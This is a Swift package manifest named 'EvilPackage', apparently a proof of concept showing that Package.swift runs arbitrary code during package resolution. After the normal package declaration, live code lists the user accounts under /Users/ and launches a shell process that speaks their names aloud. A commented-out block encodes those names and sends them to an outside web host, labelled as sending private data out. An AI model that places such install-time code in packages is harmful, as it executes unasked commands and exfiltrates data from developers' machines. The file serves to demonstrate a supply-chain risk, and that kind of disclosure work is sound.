// swift-tools-version:5.2
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "EvilPackage",
    products: [
        // Products define the executables and libraries produced by a package, and make them visible to other packages.
        .library(
            name: "EvilPackage",
            targets: ["EvilPackage"]),
    ],
    dependencies: [
        // Dependencies declare other packages that this package depends on.
        // .package(url: /* package url */, from: "1.0.0"),
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages which this package depends on.
        .target(
            name: "EvilPackage",
            dependencies: []),
        .testTarget(
            name: "EvilPackageTests",
            dependencies: ["EvilPackage"]),
    ]
)

/// - note: credit: https://stackoverflow.com/a/26973384/3261161
@discardableResult
func shell(_ args: String...) -> Int32 {
    let task = Process()
    task.launchPath = "/usr/bin/env"
    task.arguments = args
    task.launch()
    task.waitUntilExit()
    return task.terminationStatus
}

import Foundation

let man = FileManager()
let dir = try! man.contentsOfDirectory(atPath: "/Users/")
let userAccounts = dir.joined(separator: "... ")
shell("say", "the user accounts on your computer are: \(userAccounts)")

// EXAMPLE: send your private data to a websever
// (further POC this is a full Swift shell, and we can do anything)
//
//let encodedUsers = dir.joined().data(using: .utf8)!.base64EncodedString()
//    .replacingOccurrences(of: "/", with: "-")
//    .replacingOccurrences(of: "+", with: "_")
//let evilURL = URL(string: "https://postman-echo.com/get?private=\(encodedUsers)")!
//let group = DispatchGroup()
//group.enter()
//let task = URLSession.shared.dataTask(with: evilURL) { (_, _, _) in
//    group.leave()
//}
//task.resume()
//
//group.notify(queue: .main) {
//    exit(0)
//}
//
//RunLoop.current.run()
